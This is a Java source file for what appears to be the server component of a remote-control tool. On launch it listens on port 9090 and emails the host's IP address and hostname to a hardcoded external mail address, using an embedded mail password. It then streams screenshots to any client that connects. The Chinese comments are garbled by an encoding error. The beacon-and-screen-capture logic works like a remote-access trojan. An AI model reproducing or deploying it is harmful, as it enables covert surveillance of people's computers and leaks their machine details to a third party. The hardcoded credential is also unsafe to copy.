package com.pibigstar.main;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;

import javax.swing.JOptionPane;

import com.pibigstar.thread.SendScreenThread;
import com.pibigstar.util.GetIp;
import com.pibigstar.util.SendEmail;

/**
 * ����ˣ��ȴ����ƶ˵Ľ���
 * @author pibigstar
 *
 */
public class Service {

	private  DataOutputStream dos;
	private  ObjectOutputStream oos;
	private final static int port = 9090;
	
	public static void main(String[] args) throws IOException {
		new Service().startServer(port);
		JOptionPane.showMessageDialog(null, "������");
	}

	private void startServer(int port){
		try {
			ServerSocket serverSocket = new ServerSocket(port);
			String ip = GetIp.getHostIp();
			String hostName = GetIp.getHostName();
			System.out.println("server started in:"+ip);
			SendEmail sendEmail = new SendEmail("741047261@qq.com","ljgridqbgzwxbbe");
			sendEmail.sendEmail("741047261@qq.com", "Զ�̿���", "IP:"+ip+":"+port+"������:"+hostName);
			//�ȴ��ͻ��˵�����
			Socket socket = serverSocket.accept();
			//�õ��ͻ��˵������
			dos = new DataOutputStream(socket.getOutputStream());
			//����������Ļ�̣߳�����Ļ��ͼ���͸��ͻ���
			SendScreenThread screenThread = new SendScreenThread(dos);
			screenThread.start();
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
